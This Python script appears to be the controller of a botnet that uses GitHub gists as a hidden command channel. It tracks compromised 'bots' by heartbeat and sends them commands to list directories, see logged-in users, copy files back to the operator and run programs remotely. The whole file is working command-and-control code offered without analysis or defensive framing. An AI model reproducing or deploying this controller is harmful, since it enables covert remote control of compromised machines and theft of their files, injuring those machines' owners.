from github import Github, InputFileContent
from threading import Thread
from dotenv import load_dotenv
from time import time, sleep
from base64 import b64decode
from math import floor
from os import getenv

load_dotenv()
TOKEN = getenv('GITHUB_TOKEN')
if TOKEN is None:
  print('ERROR: Missing GitHub token')
  exit(1)

g = Github(TOKEN)
me = g.get_user()
bots = {}

def get_bots():
  gists = me.get_gists()
  for gist in gists:
    if gist.description == 'bsy-cc' and not gist.id in bots:
      bots[gist.id] = False

def check_hearbeat():
  now = floor(time())
  for gid in bots.keys():
    hb = g.get_gist(gid).files.get('heartbeat.md')
    if hb is not None:
      bots[gid] = now - int(hb.content[9:-4]) < 10

def update_botlist():
  while True:
    get_bots()
    check_hearbeat()
    sleep(10)

def print_help():
  print('Available commands:')
  print('  list <- prints the list of IDs of currently active bots')
  print('  help <- prints this list of commands')
  print('  ls <bot-id> <path>')
  print('  w <bot-id>')
  print('  id <bot-id>')
  print('  scp <bot-id> <src_path> <dest_path>')
  print('  exec <bot-id> <path>')
  print()

Thread(target=update_botlist, daemon=True).start()
print_help()

def submit_to_bot(id, cmd):
  if len(id) != 32 or not id in bots or not bots[id]:
    print('ERROR: Invalid bot ID')
    return None

  g.get_gist(id).edit(files={
    'comm.md': InputFileContent(f'hi\n<!-- req {cmd} -->')
  })

  attempts = 3
  while attempts > 0:
    sleep(7)
    files = g.get_gist(id).files
    comm = files.get('comm.md')

    if comm is not None and comm.content[8:11] == 'res':
      return comm.content[12:-4]
    else:
      attempts = attempts - 1 if not bots[id] else 3

  print('ERROR: Bot is no longer active')
  return None

def cmd_ls(cmd):
  if len(cmd) < 3 or len(cmd[2]) < 1:
    print('ERROR: Invalid arguments')
    return

  res = submit_to_bot(cmd[1], f'ls {cmd[2]}')
  if res is not None:
    print(res, end='')

def cmd_w(cmd):
  if len(cmd) < 2:
    print('ERROR: Missing arguments')
    return

  res = submit_to_bot(cmd[1], 'w')
  if res is not None:
    print(res, end='')

def cmd_id(cmd):
  if len(cmd) < 2:
    print('ERROR: Missing arguments')
    return

  res = submit_to_bot(cmd[1], 'id')
  if res is not None:
    print(res, end='')

def cmd_scp(cmd):
  if len(cmd) < 4 or len(cmd[2]) < 1 or len(cmd[3]) < 1:
    print('ERROR: Invalid arguments')
    return

  try:
    with open(cmd[3], 'wb') as f:
      res = submit_to_bot(cmd[1], f'scp {cmd[2]}')
      if res is None:
        return

      if res == 'err':
        print('ERROR: Unable to read file on remote machine')
        return

      f.write(b64decode(res))
  except:
    print('ERROR: Unable to write file on local machine')
    return

def cmd_exec(cmd):
  if len(cmd) < 3 or len(cmd[2]) < 1:
    print('ERROR: Invalid arguments')
    return

  args = ' '.join(filter(lambda x: len(x) > 0, cmd[2:]))
  res = submit_to_bot(cmd[1], f'exec {args}')
  if res is not None:
    print(res, end='')

def main():
  while True:
    cmd = input('> ').split(' ')
    if cmd[0] == 'list':
      count = 0
      for gid in bots.keys():
        if bots[gid]:
          print(gid)
          count += 1

      if count == 0:
        print('-- No bots currently active --')
    elif cmd[0] == 'help':
      print_help()
    elif cmd[0] == 'ls':
      cmd_ls(cmd)
    elif cmd[0] == 'w':
      cmd_w(cmd)
    elif cmd[0] == 'id':
      cmd_id(cmd)
    elif cmd[0] == 'scp':
      cmd_scp(cmd)
    elif cmd[0] == 'exec':
      cmd_exec(cmd)
    else:
      print('ERROR: Unknown comamnd')

try:
  main()
except KeyboardInterrupt:
  exit(0)
